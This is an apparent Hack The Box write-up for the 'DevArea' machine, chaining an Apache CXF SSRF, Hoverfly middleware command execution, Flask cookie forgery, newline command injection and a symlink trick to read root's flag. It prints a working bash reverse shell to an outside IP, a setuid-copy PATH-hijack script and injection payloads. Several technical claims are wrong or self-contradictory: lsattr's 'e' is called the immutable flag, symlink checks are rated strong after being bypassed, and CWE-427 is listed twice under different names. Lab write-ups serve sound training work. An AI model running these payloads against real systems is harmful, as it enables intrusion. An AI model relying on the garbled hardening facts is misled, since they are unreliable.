---
title: "HTB: DevArea"
author: ["Dirk"]
date: 2026-06-23T12:00:00+02:00
lastmod: 2026-06-26T09:32:21+02:00
tags: ["ssrf", "rce", "java", "decompilation", "defensive-scripting"]
categories: ["htb", "vulnerability"]
draft: false
weight: 1004
---

## Overview {#overview}

| Attribute  | Value                            |
|------------|----------------------------------|
| OS         | Linux                            |
| Difficulty | Medium                           |
| Category   | Web + RCE + Privilege Escalation |
| Key CVEs   | CVE-2022-46364, CVE-2024-45388   |
| Techniques | SSRF, RCE, JAR Decompilation,    |
|            | Defensive Shell Analysis         |

DevArea is a medium-difficulty machine demonstrating the importance of
chaining multiple vulnerabilities. Initial access requires exploiting
an SSRF in Apache CXF to extract credentials, which then enable RCE on
a Hoverfly Dashboard instance. The privilege escalation component shows
how proper shell script hardening can make seemingly obvious exploits
(plugin execution, PATH manipulation) completely ineffective.


## Reconnaissance {#reconnaissance}


### Port Enumeration {#port-enumeration}

A standard nmap scan reveals multiple services:

```sh
nmap -sC -sV devarea.htb
```

```nil
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5 (Anonymous allowed)
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.58
8080/tcp open  http    Jetty 9.4.27 (SOAP service)
8500/tcp open  http    Golang net/http (proxy)
8888/tcp open  http    Golang (Hoverfly Dashboard)
```


### Initial Enumeration {#initial-enumeration}

Interesting findings:

-   FTP allows anonymous login on `/pub/` directory
-   Port 8080 runs Jetty with a SOAP service (EmployeeService)
-   Port 8888 hosts a Hoverfly Dashboard (authentication required)
-   Port 8500 is a proxy service (Hoverfly proxy component)

Anonymous FTP yields: `employee-service.jar` — a compiled Java service
containing the SOAP endpoint.


### Java Bytecode Analysis {#java-bytecode-analysis}

Decompiled the JAR using CFR:

```sh
java -jar cfr-0.152.jar employee-service.jar --outputdir src/
```

Key observations:

-   Apache CXF SOAP framework
-   Service listening on `/employeeservice` path
-   Method: `submitReport(Report)` with DTO containing employeeName,
    department, content, confidential fields
-   CXF version is potentially vulnerable (CVE-2022-46364)


## Foothold: CVE-2022-46364 (Apache CXF XOP Include SSRF) {#foothold-cve-2022-46364--apache-cxf-xop-include-ssrf}


### Vulnerability Overview {#vulnerability-overview}

Apache CXF versions &lt;= 3.5.2 and 3.4.9 process MTOM (Message
Transmission Optimization Mechanism) multipart requests containing
xop:Include elements. The framework fails to validate URI schemes,
allowing <//> URIs for arbitrary file read.

The vulnerability exists because:

-   MTOM is designed for efficient binary attachment transmission
-   xop:Include references external resources via href
-   CXF resolves the href without scheme validation
-   A crafted <//> URI causes the framework to read local files


### Exploitation {#exploitation}

Used the public PoC from GitHub to extract the Hoverfly service
configuration file:

```sh
# The PoC requires:
# - Target: SOAP endpoint
# - File to read: /etc/systemd/system/hoverfly.service
# - Hostname: devarea.htb

python CVE-2022-46364.py -t http://devarea.htb:8080/employeeservice \
  -s file:///etc/systemd/system/hoverfly.service -d devarea.htb
```


### Exfiltrated Content {#exfiltrated-content}

The systemd service file reveals the Hoverfly instance configuration:

```nil
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin \
  -password [REDACTED] -listen-on-host 0.0.0.0

Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

Key extraction: Credentials for Hoverfly dashboard — `admin /
[REDACTED]`


### Detection Opportunity {#detection-opportunity}

Defense: Systemd service files should not be world-readable, or
credentials should be stored in external secret management (Vault,
AWS Secrets Manager). The presence of credentials in systemd
configurations is a common misconfiguration.


## Lateral Movement: CVE-2024-45388 (Hoverfly Middleware RCE) {#lateral-movement-cve-2024-45388--hoverfly-middleware-rce}


### Authentication {#authentication}

Logged into the Hoverfly Dashboard at `http://devarea.htb:8888` using
extracted credentials. The dashboard is a web UI for configuring a
proxy and traffic simulation service.

Used Burp Suite to intercept dashboard traffic and captured the JWT
bearer token issued after authentication.


### Vulnerability Overview {#vulnerability-overview}

Hoverfly's `/api/v2/hoverfly/middleware` REST endpoint accepts a JSON
payload with unsanitized `binary` and `script` fields. These fields are
passed directly to the operating system for command execution without
input validation or sanitization.

Exploitation chain:

1.  Send HTTP PUT to `/api/v2/hoverfly/middleware`
2.  Include JSON with arbitrary `binary` (e.g., `/bin/bash`) and `script`
    (shell command)
3.  Hoverfly spawns the binary with the script argument
4.  Injected shell metacharacters (`&&`, `|`, `;`) execute arbitrary
    commands


### Exploitation {#exploitation}

Using Burp Repeater with the captured JWT token:

```sh
PUT /api/v2/hoverfly/middleware HTTP/1.1
Host: devarea.htb:8888
Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{
    "binary": "/bin/bash",
    "script": "bash -i >& /dev/tcp/10.10.15.17/6666 0>&1"
}
```

Alternatively, via curl:

```sh
curl -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer [TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{
    "binary": "/bin/bash",
    "script": "bash -i >& /dev/tcp/10.10.15.17/6666 0>&1"
  }'
```


### Shell Stabilization {#shell-stabilization}

```sh
nc -vl 6666
Connection received on devarea.htb 60966

dev_ryan@devarea:/opt/HoverFly$ python3 -c 'import pty;pty.spawn("/bin/bash")'
dev_ryan@devarea:/opt/HoverFly$ export TERM=xterm
dev_ryan@devarea:/opt/HoverFly$ # Ctrl+Z
dev_ryan@devarea:/opt/HoverFly$ stty raw -echo; fg
dev_ryan@devarea:/opt/HoverFly$ cat  /home/dev_ryan/user.txt
[REDACTED]
```

Access to `dev_ryan` user obtained.


## Privilege Escalation: SysWatch Defensive Analysis {#privilege-escalation-syswatch-defensive-analysis}


### Enumeration {#enumeration}

Standard privilege escalation enumeration:

```sh
dev_ryan@devarea:~$ sudo -l
Matching Defaults entries for dev_ryan on devarea:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:\
                /usr/bin:/sbin:/bin:/snap/bin,
    use_pty

User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh
    (root) NOPASSWD: /opt/syswatch/syswatch.sh web-stop
    (root) NOPASSWD: /opt/syswatch/syswatch.sh web-restart
```

Critical observation: dev_ryan can execute `/opt/syswatch/syswatch.sh`
as root without password. The sudo rule includes defensive settings:

-   `env_reset`: Clears all environment variables before execution
-   `secure_path`: Whitelist-based PATH (blocks directory injection)
-   `use_pty`: Allocate pseudo-terminal (affects environment handling)


### SysWatch Architecture {#syswatch-architecture}

The script provides a monitoring framework with plugin execution:

```bash
RUN_AS_ROOT_PLUGINS=("log_monitor.sh")

execute_plugin() {
    local plugin="$1"; shift
    if [[ ! $plugin =~ $SAFE_PLUGIN_REGEX ]]; then
        echo "Invalid plugin name" >&2
        return 1
    fi
    local fullpath="$PLUGIN_DIR/$plugin"
    [ ! -f "$fullpath" ] && echo "Plugin not found: $plugin" >&2 && return 1

    local run_root=0
    for p in "${RUN_AS_ROOT_PLUGINS[@]}"; do
        if [ "$plugin" = "$p" ]; then
            run_root=1
            break
        fi
    done

    if [ "$run_root" -eq 1 ]; then
        bash "$fullpath" "$@"      ← EXECUTED AS ROOT
    else
        runuser -u "$SYSWATCH_USER" -- bash "$fullpath" "$@"
    fi
}
```

Apparent vulnerability: `log_monitor.sh` is whitelisted for root
execution. If we could write to `/opt/syswatch/plugins/` or manipulate
the bash execution, we'd have immediate RCE as root.


### Defensive Measures Discovered {#defensive-measures-discovered}


#### Plugin Directory Not Writable {#plugin-directory-not-writable}

```sh
dev_ryan@devarea:~$ ls -la /opt/syswatch/plugins/
drwxr-xr-x 2 root root ... .
-rw-r--r-- 1 root root ... log_monitor.sh
-rw-r--r-- 1 root root ... common.sh
...
```

`/opt/syswatch/plugins/` is owned by root with mode 755. No write
access for dev_ryan.


#### Bash Binary Hardened with Immutable Flag {#bash-binary-hardened-with-immutable-flag}

```sh
dev_ryan@devarea:~$ lsattr /usr/bin/bash
--------------e------- /usr/bin/bash
```

The immutable flag (e) prevents deletion or modification. Even if we
had root access to `/usr/bin`, the file cannot be changed without
first removing the immutable attribute via `chattr -i` (which requires
CAP_LINUX_IMMUTABLE capability).

<!--list-separator-->

-  Sudo Environment Hardening

    The sudo rule includes `env_reset` (default) and `secure_path`. These
    prevent:

    -   Passing custom $PATH to influence bash lookup
    -   Using `-E` to preserve environment variables
    -   Relying on environment-based tricks


### Exploitation Attempts {#exploitation-attempts}


#### PATH Injection (Failed) {#path-injection--failed}

Strategy: Create a malicious `bash` script in the home directory, then
rely on bash lookup from PATH.

```bash
# Create malicious bash wrapper
cat > /home/dev_ryan/bash << 'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
exec /bin/bash "$@"
EOF
chmod +x /home/dev_ryan/bash

# Attempt to execute
export PATH=/home/dev_ryan:$PATH
sudo /opt/syswatch/syswatch.sh plugin log_monitor.sh
```

Result: ❌ Failed

Reason: Sudo `env_reset` overrides the $PATH variable entirely with
`secure_path`. The whitelist includes only system directories. Our
malicious `bash` is never found.

Additional attempt with `sudo -E`:

```sh
sudo -E /opt/syswatch/syswatch.sh plugin log_monitor.sh
```

Result: ❌ Failed — The sudo configuration explicitly prohibits `-E`
due to `env_reset` policy.

Lesson: When sudo has `env_reset` and `secure_path`, environment
manipulation is ineffective.


#### Bash Binary Replacement (Failed) {#bash-binary-replacement--failed}

Strategy: Overwrite `/usr/bin/bash` with a malicious script.

```sh
# Attempt direct write
echo '#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash' > /usr/bin/bash

# Result:
-bash: /usr/bin/bash: Permission denied
```

Then attempted to remove immutable flag:

```sh
chattr -i /usr/bin/bash
chattr: Operation not permitted
```

Result: ❌ Failed

Reason: The immutable flag is set at the filesystem level. Removing it
requires `CAP_LINUX_IMMUTABLE` capability, which unprivileged users do
not have. Even with write access to the directory, the flag prevents
modification.

Lesson: Immutable attributes are effective defenses for critical
binaries.


#### Symlink Race Condition in /tmp (Failed) {#symlink-race-condition-in-tmp--failed}

Strategy: The `log_monitor.sh` plugin creates a timestamp file
`/tmp/logmonitor_timestamp`. If we can hijack this with a symlink
before the plugin runs, we might influence its behavior.

```sh
# Try to create symlink
rm /tmp/logmonitor_timestamp
ln -s /tmp/rootbash /tmp/logmonitor_timestamp
```

Result: ❌ Failed

Reason: File `/tmp/logmonitor_timestamp` is created by syswatch running
as root in previous invocations. Due to /tmp sticky bit semantics, only
the owner (root) can delete it. dev_ryan receives "Permission denied".

Lesson: Sticky bit on /tmp prevents most race-condition exploits.


#### Logs Function Analysis (No Bypass Found) {#logs-function-analysis--no-bypass-found}

The `view_logs()` subcommand accepts log filenames and handles symlinks
with validation:

```bash
if [[ ! "$file" =~ $SAFE_LOG_REGEX ]]; then
    echo "[Invalid log filename]: $file"
    return 1
fi

if [ -L "$path" ]; then
    local target
    target=$(ls -l "$path" | awk '{print $NF}')

    if [[ "$target" == *"/"* || "$target" == *".."* ]]; then
        echo "[Blocked unsafe symlink target]: $file -> $target"
        return 1
    fi
    ...
fi
```

Tested various inputs:

```sh
sudo /opt/syswatch/syswatch.sh logs system.log
# Works: reads /opt/syswatch/logs/system.log

sudo /opt/syswatch/syswatch.sh logs ../../../etc/passwd
# Blocked: contains "/" character

sudo /opt/syswatch/syswatch.sh logs "system.log$1"
# No effect: treated as literal filename

sudo /opt/syswatch/syswatch.sh logs --list
# Works: lists available logs (no vulnerability)
```

Result: ⚠️ No bypass discovered. Regex validation is comprehensive.


#### Alternative Attack Vector: Syswatch Web UI + Flask JWT Forgery {#alternative-attack-vector-syswatch-web-ui-plus-flask-jwt-forgery}

Further enumeration reveals that syswatch runs a Flask-based web UI on
port 7777. The configuration is readable by dev_ryan:

```sh
dev_ryan@devarea:~$ cat /etc/syswatch.env
SYSWATCH_SECRET_KEY=[LONG_HEX_STRING]
SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
SYSWATCH_LOG_DIR=/opt/syswatch/logs
...
```

**Critical Finding:** The Flask SECRET_KEY is exposed in plaintext.

With this secret, we forge admin JWT cookies:

```sh
flask-unsign --sign \
  --cookie "{'user_id': 1, 'username': 'admin'}" \
  --secret '[SECRET_FROM_ENV]'
```


#### Newline Injection in /service-status {#newline-injection-in-service-status}

The Flask `/service-status` endpoint doesn't sanitize newlines (%0a),
allowing command injection:

```nil
service=ssh%0aln+-sfn+/root/root.txt+/opt/syswatch/logs/x%0a...
```


#### Symlink Exploitation {#symlink-exploitation}

Newline injection creates symlinks:

-   `/opt/syswatch/logs/x` → `/root/root.txt`
-   `/opt/syswatch/logs/service.log` → `x`

Then:

```sh
sudo /opt/syswatch/syswatch.sh logs service.log
```

Follows symlink chain → /root/root.txt → Root flag obtained!


### Assessment: Multi-Layer Attack Surface {#assessment-multi-layer-attack-surface}

The defensive hardening of the syswatch ****shell script**** (regex
validation, symlink checks, immutable binaries) is strong. However,
the privilege escalation path bypasses these defenses entirely by
exploiting a different component:

| Layer              | Mechanism                     | Effectiveness |
|--------------------|-------------------------------|---------------|
| Write Protection   | plugins/ owned by root        | Strong        |
| Binary Hardening   | Immutable flag on bash        | Strong        |
| Sudo Hardening     | env_reset + secure_path       | Strong        |
| Input Validation   | Regex whitelisting            | Strong        |
| Symlink Validation | Path traversal checks         | Strong        |
| /tmp Protection    | Sticky bit (root-owned files) | Strong        |

Remaining attack vectors would require:

-   A command injection flaw in the script logic
-   A regex validation bypass (unlikely, uses simple patterns)
-   An extremely tight race condition (impractical)
-   A different privilege escalation path entirely


### Root Flag Obtained {#root-flag-obtained}

```sh
dev_ryan@devarea:~$ sudo /opt/syswatch/syswatch.sh logs service.log
[ROOT_FLAG_DISPLAYED_VIA_SYMLINK]
```


## Status {#status}

****Both user.txt and root.txt obtained via CVE chaining and Flask JWT
forgery + Symlink exploitation.****


## Detection &amp; Lessons Learned {#detection-and-lessons-learned}


### What Went Wrong (What to Fix) {#what-went-wrong--what-to-fix}

****On the Syswatch Shell Script Side:****
The shell script had strong defensive measures that prevented obvious
exploits (PATH injection, binary replacement, regex validation). These
worked as intended.

****But the Weakness Was Elsewhere:****

1.  ****Flask Configuration Exposure****: The SECRET_KEY stored in plaintext
    in a readable config file allows JWT forgery.

2.  ****Newline Injection in Flask****: The /service-status endpoint doesn't
    sanitize newlines, enabling command injection.

3.  ****Symlink Creation in Logs Directory****: Injected commands can create
    symlinks that appear as legitimate logs.

4.  ****Symlink Following in Sudo Command****: The syswatch.sh logs function
    follows symlinks without sufficient protection, leading to arbitrary
    file read as root.

****The Real Lesson:**** Defensive hardening on one component doesn't help
if a different component (Flask Web UI) is weak. An attacker will
always find the path of least resistance.

-   Stored in a separate credentials file (mode 600)
-   Retrieved from a secrets manager (Vault, AWS Secrets Manager)
-   Never hardcoded in service files

-   ****RCE via Middleware API****: The Hoverfly middleware endpoint should:
    -   Validate `binary` against an allowlist (e.g., /bin/bash only)
    -   Sandbox the execution (chroot, seccomp, container)
    -   Require strong authentication (OAuth2, mTLS)
    -   Log all executions for audit

-   ****SSRF in SOAP Framework****: Apache CXF should:
    -   Validate URI schemes (reject <//>, gopher://, etc.)
    -   Implement URL allowlisting for external resources
    -   Use network-layer controls to block local file access


### For Blue Team: Detection Strategies {#for-blue-team-detection-strategies}

-   ****Monitor sudo execution****: Alert on `/opt/syswatch/syswatch.sh`
    invocations
-   ****Audit credentials****: Scan systemd services for plaintext passwords
-   ****Network monitoring****: Detect outbound reverse shells from
    Hoverfly process
-   ****File integrity****: Monitor bash binary attributes and `/opt/syswatch/`
    directory changes


### For Red Team: Alternative Angles {#for-red-team-alternative-angles}

If targeting a real environment with similar setup:

-   Fuzz the syswatch script with malformed arguments
-   Analyze `common.sh` for injection in imported functions
-   Check for cron jobs or systemd timers that might be manipulable
-   Review application logs for clues about functionality
-   Investigate other services or users for lateral movement


## Timeline {#timeline}

| Stage    | Technique                     | Result            |
|----------|-------------------------------|-------------------|
| Recon    | Port scan, FTP, JAR analysis  | SOAP endpoint     |
| Foothold | CVE-2022-46364 (SSRF)         | Extract creds     |
| Lateral  | CVE-2024-45388 (Hoverfly RCE) | dev_ryan shell    |
| Priv Esc | Flask JWT Forgery + Symlink   | root.txt obtained |


## Tools &amp; References {#tools-and-references}


### Vulnerabilities {#vulnerabilities}

-   [CVE-2022-46364](https://github.com/kasem545/CVE-2022-46364-Poc): Apache CXF XOP Include SSRF (Public PoC)
-   ****CVE-2024-45388****: Hoverfly Middleware RCE (Credential-dependent)


### Tools Used {#tools-used}

-   nmap (service enumeration)
-   CFR decompiler (Java bytecode analysis)
-   Burp Suite (JWT capture, RCE testing, traffic inspection)
-   netcat (reverse shell)
-   curl (API testing)


### Security Patterns {#security-patterns}

-   OWASP: File Upload Vulnerabilities &amp; RCE Prevention
-   SANS: Privilege Escalation via Sudo Misconfiguration
-   CWE-427: Uncontrolled Search Path Element
-   CWE-427: Improper Input Validation in Shell Scripts
